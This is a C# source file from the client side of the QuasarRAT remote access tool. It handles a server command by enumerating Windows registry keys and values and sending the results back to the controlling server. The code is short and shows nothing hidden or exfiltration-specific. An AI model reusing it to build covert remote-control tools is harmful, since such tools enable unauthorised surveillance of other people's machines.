using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xClient.Core.Networking;
using xClient.Core.Registry;

namespace xClient.Core.Commands
{
    /*
     * Derived and Adapted By Justin Yanke
     * github: https://github.com/yankejustin
     * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     * This code is created by Justin Yanke and has only been
     * modified partially.
     * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     * Modified by StingRaptor on January 21, 2016
     * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     * Original Source:
     * https://github.com/quasar/QuasarRAT/blob/regedit/Client/Core/Commands/RegistryHandler.cs
     */

    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE THE REGISTRY. */
    public static partial class CommandHandler
    {
        public static void HandleGetRegistryKey(xClient.Core.Packets.ServerPackets.DoLoadRegistryKey packet, Client client)
        {
            try
            {

                seeker = new RegistrySeeker();

                xClient.Core.Packets.ClientPackets.GetRegistryKeysResponse responsePacket = new Packets.ClientPackets.GetRegistryKeysResponse();

                seeker.SearchComplete += (object o, SearchCompletedEventArgs e) =>
                {
                    responsePacket.Matches = e.Matches.ToArray();
                    responsePacket.RootKey = packet.RootKeyName;

                    responsePacket.Execute(client);
                };

                // If the search parameters of the packet is null, the server is requesting to obtain the root keys.
                if (packet.RootKeyName == null)
                {
                    seeker.Start(new RegistrySeekerParams(null, Enums.RegistrySearchAction.Keys | Enums.RegistrySearchAction.Values));
                }
                else
                {
                    seeker.Start(packet.RootKeyName);
                }
            }
            catch
            { }
        }
    }
}
